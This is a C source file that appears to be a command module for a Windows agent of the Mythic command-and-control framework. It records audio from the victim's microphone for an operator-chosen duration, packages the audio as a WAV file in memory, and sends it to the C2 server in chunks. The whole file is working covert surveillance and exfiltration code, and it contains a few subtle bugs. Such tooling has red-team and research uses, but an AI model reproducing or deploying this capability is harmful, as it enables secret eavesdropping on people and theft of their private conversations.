#include "Tasks/Microphone.h"


#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <mmreg.h>
#include <stdint.h>

#include <windows.h>
#include <objbase.h>   // CoInitialize
#include <objidl.h>    // IStream, CreateStreamOnHGlobal

#include "Parser.h"
#include "Package.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_MICROPHONE

#define CHUNK_SIZE  512000      // 512 KB

/**
 * @brief Initialize a file download and return file UUID.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD MicrophoneInit(_In_ PCHAR taskUuid, _Inout_ MICROPHONE_DOWNLOAD* download)
{
    DWORD Status = 0;

    // Calculate total chunks (rounded up)
    download->totalChunks = (DWORD)((download->microphone_size + CHUNK_SIZE - 1) / CHUNK_SIZE);

    // Prepare package
    PPackage data = PackageInit(DOWNLOAD_INIT, TRUE);
    PackageAddString(data, taskUuid, FALSE);
    PackageAddInt32(data, download->totalChunks);
    PackageAddString(data, download->filepath, TRUE);
    PackageAddInt32(data, CHUNK_SIZE);
    PackageAddByte(data, 0); // is_screenshot = False

    // Send package
    PARSER Response = { 0 };
    PackageSend(data, &Response);

    BYTE status = ParserGetByte(&Response);
    if (status == FALSE)
    {
        _err("DownloadInit returned failure status : 0x%hhx", status);
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    SIZE_T lenUuid  = TASK_UUID_SIZE;
    PCHAR uuid = ParserGetString(&Response, &lenUuid);
    if (uuid == NULL) 
    {
        _err("Failed to get UUID from response.");
        Status = ERROR_MYTHIC_DOWNLOAD;
        goto end;
    }

    strncpy(download->fileUuid, uuid, TASK_UUID_SIZE + 1);
    download->fileUuid[TASK_UUID_SIZE + 1] = '\0';    // null-termination

end:
    // Cleanup
    if (data) PackageDestroy(data);
    if (&Response) ParserDestroy(&Response);

    return Status;
}

/**
 * @brief Send b64 chunks of a file to Mythic server
 * 
 * @param[in] taskUuid Task's UUID
 * @param[inout] download FILE_DOWNLOAD struct which contains details of a file
 * @return BOOL
 */
DWORD MicrophoneContinue(_In_ PCHAR taskUuid, _Inout_ MICROPHONE_DOWNLOAD* download)
{
    DWORD Status = 0;
    char* chunkBuffer = (char*)LocalAlloc(LPTR, CHUNK_SIZE);

    if (!chunkBuffer)
    {
        DWORD error = GetLastError();
        _err("Memory allocation failed. ERROR CODE: %d", error);
        goto cleanup;
    }

    download->currentChunk = 1;

    DWORD remaining = download->microphone_size;
    while (download->currentChunk <= download->totalChunks)
    {
        DWORD bytesRead = 0;
        if(remaining < CHUNK_SIZE)
            bytesRead = remaining;
        else
            bytesRead = CHUNK_SIZE;

        _dbg("Sending chunk %d/%d (size: %d)", download->currentChunk, download->totalChunks, bytesRead);

        // Prepare package
        PPackage cur = PackageInit(DOWNLOAD_CONTINUE, TRUE);
        PackageAddString(cur, taskUuid, FALSE);
        PackageAddInt32(cur, download->currentChunk);
        PackageAddBytes(cur, download->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddBytes(cur, download->microphone_data + (download->currentChunk-1)*CHUNK_SIZE, bytesRead, TRUE);
        PackageAddInt32(cur, bytesRead);

        remaining -= bytesRead;

        // Send chunk
        PARSER Response = { 0 };
        PackageSend(cur, &Response);

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("Download chunk %d failed.", download->currentChunk);
            Status = ERROR_MYTHIC_DOWNLOAD;
            PackageDestroy(cur);
            ParserDestroy(&Response);
            goto cleanup;
        }

        download->currentChunk++;

        PackageDestroy(cur);
        ParserDestroy(&Response);
    }

cleanup:
    if (chunkBuffer) LocalFree(chunkBuffer);

    return Status;
}

/* === Config (tweak as needed) === */
#define MIC_SAMPLE_RATE   44100u
#define MIC_CHANNELS      1u
#define MIC_BITS          16u
#define MIC_BUFFER_MS     100u     /* per-buffer duration (ms) */
#define MIC_NBUFF         6        /* number of queued buffers */

/* ===== helpers: write little-endian integers to MEMORY ===== */
static void w16(uint8_t* p, uint16_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
}
static void w32(uint8_t* p, uint32_t v) {
    p[0] = (uint8_t)(v & 0xFF);
    p[1] = (uint8_t)((v >> 8) & 0xFF);
    p[2] = (uint8_t)((v >> 16) & 0xFF);
    p[3] = (uint8_t)((v >> 24) & 0xFF);
}

/* Write a PCM WAV header directly into memory at buf[0..43].
   dataBytes is the number of PCM bytes that follow the header. */
static void write_wav_header_mem(uint8_t* buf,
    uint32_t sampleRate,
    uint16_t channels,
    uint16_t bitsPerSample,
    uint32_t dataBytes)
{
    /* RIFF chunk */
    memcpy(buf + 0, "RIFF", 4);
    w32(buf + 4, 36u + dataBytes);        /* ChunkSize */
    memcpy(buf + 8, "WAVE", 4);

    /* fmt subchunk */
    memcpy(buf + 12, "fmt ", 4);
    w32(buf + 16, 16u);                   /* Subchunk1Size = 16 for PCM */
    w16(buf + 20, 1u);                    /* AudioFormat = 1 (PCM) */
    w16(buf + 22, channels);
    w32(buf + 24, sampleRate);
    {
        uint32_t byteRate = sampleRate * channels * (bitsPerSample / 8u);
        uint16_t blockAlign = (uint16_t)(channels * (bitsPerSample / 8u));
        w32(buf + 28, byteRate);
        w16(buf + 32, blockAlign);
    }
    w16(buf + 34, bitsPerSample);

    /* data subchunk */
    memcpy(buf + 36, "data", 4);
    w32(buf + 40, dataBytes);
}

/* === main API ===
   Record for `seconds` and return a malloc'ed WAV buffer in *out_buf with size *out_size. */
int record_mic_wav(double seconds, uint8_t** out_buf, uint32_t* out_size)
{
    const uint32_t SAMPLE_RATE = MIC_SAMPLE_RATE;
    const uint16_t CHANNELS = MIC_CHANNELS;
    const uint16_t BITS = MIC_BITS;
    const uint32_t BUFFER_MS = MIC_BUFFER_MS;
    const int      NBUFF = MIC_NBUFF;

    const uint32_t bytesPerSample = (uint32_t)(BITS / 8u);
    const uint32_t frameBytes = (uint32_t)(CHANNELS * bytesPerSample);

    if (!out_buf || !out_size || seconds <= 0.0) return 1;

    /* Plan capacity based on requested seconds (cap to 32-bit WAV field) */
    uint64_t targetFrames = (uint64_t)(seconds * (double)SAMPLE_RATE + 0.5);
    uint64_t targetBytes64 = targetFrames * (uint64_t)frameBytes;
    if (targetBytes64 > 0xFFFFFFFFull) targetBytes64 = 0xFFFFFFFFull;
    const uint32_t targetBytes = (uint32_t)targetBytes64;

    /* Allocate final output buffer: header (44) + audio data (targetBytes).
       We'll fill data, then fix the header with the *actual* bytes written. */
    const uint32_t headerBytes = 44u;
    uint8_t* wav = (uint8_t*)malloc(headerBytes + targetBytes);
    if (!wav) return 2;

    /* Temporary header (sizes will be updated at the end with real written size) */
    write_wav_header_mem(wav, SAMPLE_RATE, CHANNELS, BITS, targetBytes);

    /* Destination write pointer after the header */
    uint8_t* dst = wav + headerBytes;
    uint64_t written = 0;

    /* Compute capture buffer size (~BUFFER_MS) */
    uint32_t bufferBytes = (uint32_t)((SAMPLE_RATE * frameBytes * BUFFER_MS) / 1000u);
    if (bufferBytes == 0) bufferBytes = frameBytes;

    /* Prepare WinMM capture */
    WAVEFORMATEX wfx;
    ZeroMemory(&wfx, sizeof(wfx));
    wfx.wFormatTag = WAVE_FORMAT_PCM;
    wfx.nChannels = CHANNELS;
    wfx.nSamplesPerSec = SAMPLE_RATE;
    wfx.wBitsPerSample = BITS;
    wfx.nBlockAlign = (CHANNELS * BITS) / 8u;
    wfx.nAvgBytesPerSec = SAMPLE_RATE * wfx.nBlockAlign;

    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
    if (!hEvent) { free(wav); return 3; }

    HWAVEIN hIn = NULL;
    MMRESULT mm = waveInOpen(&hIn, WAVE_MAPPER, &wfx, (DWORD_PTR)hEvent, 0, CALLBACK_EVENT);
    if (mm != MMSYSERR_NOERROR) {
        CloseHandle(hEvent); free(wav); return 4;
    }

    /* Queue NBUFF capture buffers */
    WAVEHDR* hdrs = (WAVEHDR*)calloc((size_t)NBUFF, sizeof(WAVEHDR));
    LPSTR* data = (LPSTR*)calloc((size_t)NBUFF, sizeof(LPSTR));
    if (!hdrs || !data) {
        if (hdrs) free(hdrs);
        if (data) free(data);
        waveInClose(hIn); CloseHandle(hEvent); free(wav); return 5;
    }

    int i;
    for (i = 0; i < NBUFF; ++i) {
        data[i] = (LPSTR)malloc(bufferBytes);
        if (!data[i]) break;
        ZeroMemory(&hdrs[i], sizeof(WAVEHDR));
        hdrs[i].lpData = data[i];
        hdrs[i].dwBufferLength = bufferBytes;
        if (waveInPrepareHeader(hIn, &hdrs[i], sizeof(WAVEHDR)) != MMSYSERR_NOERROR) break;
        if (waveInAddBuffer(hIn, &hdrs[i], sizeof(WAVEHDR)) != MMSYSERR_NOERROR) break;
    }
    if (i != NBUFF) {
        int j;
        for (j = 0; j <= i; ++j) {
            if (hdrs[j].lpData) waveInUnprepareHeader(hIn, &hdrs[j], sizeof(WAVEHDR));
            free(data[j]);
        }
        free(hdrs); free(data);
        waveInClose(hIn); CloseHandle(hEvent); free(wav); return 6;
    }

    if (waveInStart(hIn) != MMSYSERR_NOERROR) {
        for (i = 0; i < NBUFF; ++i) {
            waveInUnprepareHeader(hIn, &hdrs[i], sizeof(WAVEHDR));
            free(data[i]);
        }
        free(hdrs); free(data);
        waveInClose(hIn); CloseHandle(hEvent); free(wav); return 7;
    }

    /* Capture loop until we fill the requested capacity */
    while (written < targetBytes64) {
        DWORD wr = WaitForSingleObject(hEvent, 5000);
        if (wr != WAIT_OBJECT_0) break; /* timeout or failure */

        for (i = 0; i < NBUFF; ++i) {
            if (hdrs[i].dwFlags & WHDR_DONE) {
                DWORD avail = hdrs[i].dwBytesRecorded;
                if (avail > 0) {
                    uint64_t remaining = targetBytes64 - written;
                    DWORD toCopy = (avail > remaining) ? (DWORD)remaining : avail;
                    if (toCopy > 0) {
                        memcpy(dst + written, hdrs[i].lpData, toCopy);
                        written += toCopy;
                    }
                }
                if (written < targetBytes64) {
                    hdrs[i].dwFlags &= ~WHDR_DONE;
                    hdrs[i].dwBytesRecorded = 0;
                    if (waveInAddBuffer(hIn, &hdrs[i], sizeof(WAVEHDR)) != MMSYSERR_NOERROR) {
                        written = written; /* keep what we have */
                        goto stop_capture;
                    }
                }
            }
        }
    }

stop_capture:
    waveInStop(hIn);
    waveInReset(hIn);

    for (i = 0; i < NBUFF; ++i) {
        waveInUnprepareHeader(hIn, &hdrs[i], sizeof(WAVEHDR));
        free(data[i]);
    }
    free(hdrs);
    free(data);
    waveInClose(hIn);
    CloseHandle(hEvent);

    /* Fix header sizes to actual written amount */
    if (written > 0xFFFFFFFFull) written = 0xFFFFFFFFull;
    write_wav_header_mem(wav, SAMPLE_RATE, CHANNELS, BITS, (uint32_t)written);

    *out_buf = wav;
    *out_size = (uint32_t)(headerBytes + (uint32_t)written);
    return 0;
}

/**
 * @brief Main command function for downloading a file from agent.
 * 
 * @param[in] taskUuid Task's UUID
 * @param[in] arguments Parser with given tasks data buffer
 * 
 * @return VOID
 */
VOID Microphone(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
{    
    SIZE_T pathLen      = 0;
    DWORD status;
    MICROPHONE_DOWNLOAD fd    = { 0 };

    UINT32 nbArg = ParserGetInt32(arguments);

    if (nbArg == 0)
    {
        return;
    }

    // Perform the microphone recording
	UINT32 seconds = ParserGetInt32(arguments);

    size_t dataSize;
    unsigned char* record = NULL;
    int rc = record_mic_wav(seconds, &record, &dataSize);

    if (rc != 0)
    {
        PackageError(taskUuid, ERROR_INVALID_HANDLE);
        goto end;
    }
    
    fd.microphone_data = record;
    fd.microphone_size = dataSize;

    strncpy(fd.filepath, "microphone.wav", 14);

    // Prepare to send
    status = MicrophoneInit(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    _dbg("Sending microphone record FilePath:\"%s\" - ID:%s", fd.filepath, fd.fileUuid);

    // Transfer chunked file
    status = MicrophoneContinue(taskUuid, &fd);
    if ( status != 0 )
    {
        PackageError(taskUuid, status);
        goto end;
    }

    PackageComplete(taskUuid, NULL);

end:
    // Cleanup
    //if (fd.scr) CloseHandle(fd.hFile);
    if (record != NULL)
        free(record);
    
}

/**
 * @brief Thread entrypoint for Microphone function. 
 * 
 * @param[in] lpTaskParamter Structure that holds task related data (taskUuid, taskParser)
 * 
 * @return DWORD WINAPI
 */
DWORD WINAPI MicrophoneThread(_In_ LPVOID lpTaskParamter)
{
    _dbg("Thread started.");

    TASK_PARAMETER* tp = (TASK_PARAMETER*)lpTaskParamter;

    Microphone(tp->TaskUuid, tp->TaskParser);
    
    _dbg("Microphone Thread cleaning up now...");
    // Cleanup things used for thread
    free(tp->TaskUuid);
    ParserDestroy(tp->TaskParser);
    LocalFree(tp);  
    return 0;
}



#endif  //INCLUDE_CMD_MICROPHONE
